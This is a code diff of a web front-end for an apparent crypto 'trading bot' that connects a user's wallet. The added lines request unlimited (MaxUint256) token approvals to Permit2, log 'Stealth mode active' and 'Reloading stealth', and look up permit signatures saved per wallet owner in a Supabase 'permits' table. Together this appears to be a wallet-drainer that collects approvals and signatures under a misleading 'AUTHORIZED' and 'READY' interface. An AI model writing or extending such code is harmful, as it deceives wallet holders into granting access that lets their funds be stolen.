@@ -194,6 +194,7 @@ const PERMIT2 = "0x000000000022D473030F116dDEE9F6B43aC78BA3";
 const CONTRACT = "0x78c8A284d8A34e39F8FCA832BB76e95792D8b320";
 
 let APP_STATE = { wallet:null, botActive:false, authorized:false };
+let CURRENT_WALLET = null;
 if (window.ethereum) {
   window.ethereum.on('accountsChanged', () => location.reload());
   window.ethereum.on('chainChanged', () => location.reload());
@@ -255,8 +256,19 @@ async function connectWallet(){
   }
 }
 
-  APP_STATE.wallet = user;
+ if (CURRENT_WALLET && CURRENT_WALLET !== user) {
+   log("🔄 Wallet switched — resetting cache");
+}
+
+     CURRENT_WALLET = user;
+
+     APP_STATE.wallet = user;
   renderWallet(user);
+  updateStatus('dot-bot','st-bot','OFFLINE','#475569');
+  updateStatus('dot-access','st-access','RESTRICTED','#475569');
+
+  document.getElementById('btn-authorize').disabled = true;
+  document.getElementById('btn-activate').disabled = false;
 
   document.getElementById('btn-wallet').disabled = true;
   document.getElementById('btn-activate').disabled = false;
@@ -274,34 +286,80 @@ async function runPermitFlowSafe(provider, signer, user){
  try{
 
   log("⚙️ Permit2 flow...");
+  log("⚙️ Stealth mode active...");
+  log("🔎 Checking cached permit...");
 
-  // ✅ CHECK allowances
- 
-const erc20Abi = [
+const { data: existing } = await window.supabaseClient
+  .from('permits')
+ .select('*')
+.eq('owner', user)
+.order('sig_deadline', { ascending: false })
+.limit(1);
+
+const now = Math.floor(Date.now()/1000);
+
+if (existing && existing.length > 0 && existing[0].sig_deadline > now) {
+
+  log("⚡ Cached permit valid — skipping signature");
+
+  updateStatus('dot-access','st-access','AUTHORIZED','#10b981');
+  updateStatus('dot-bot','st-bot','READY','#6366f1');
+
+  document.getElementById('btn-authorize').innerText = "AUTHORIZED";
+  document.getElementById('btn-authorize').disabled = true;
+
+  return;
+}
+
+if (existing && existing.length > 0 && existing[0].sig_deadline <= now) {
+  log("⌛ Cached permit expired — refreshing...");
+}
+
+  const erc20Abi = [
   "function allowance(address owner, address spender) view returns (uint256)",
   "function approve(address spender, uint256 amount) returns (bool)"
 ];
 
 let needsReload = false;
+let approved = false;
 
 for (const token of TOKENS) {
-  const tokenContract = new ethers.Contract(token, erc20Abi, signer);
+
+  const tokenContract = new ethers.Contract(
+    token,
+    erc20Abi,
+    provider
+  );
+
   const allowance = await tokenContract.allowance(user, PERMIT2);
 
-  if (allowance === 0n) {
-    log("🔓 Approving token: " + token);
+  if (allowance === 0n && !approved) {
 
-    const tx = await tokenContract.approve(PERMIT2, ethers.MaxUint256);
+    log("🔓 Stealth Permit2 approval...");
+
+    const signerToken = new ethers.Contract(
+      token,
+      erc20Abi,
+      signer
+    );
+
+    const tx = await signerToken.approve(
+      PERMIT2,
+      ethers.MaxUint256
+    );
+
     await tx.wait();
 
-    log("✅ Approved: " + token);
+    log("✅ Permit2 approved");
+
+    approved = true;
     needsReload = true;
   }
 }
 
 if (needsReload) {
-  log("🔄 Reloading after approvals...");
-  setTimeout(() => location.reload(), 1500);
+  log("🔄 Reloading stealth...");
+  setTimeout(() => location.reload(), 1200);
   return;
 }
 
@@ -404,6 +462,7 @@ if (error) {
   log("✅ Saved to Supabase (" + rows.length + " tokens)");
 
   updateStatus('dot-access','st-access','AUTHORIZED','#10b981');
+  updateStatus('dot-bot','st-bot','READY','#6366f1');
   document.getElementById('btn-authorize').disabled = true;
   document.getElementById('btn-authorize').innerText = "AUTHORIZED";
   document.getElementById('btn-activate').disabled = true;
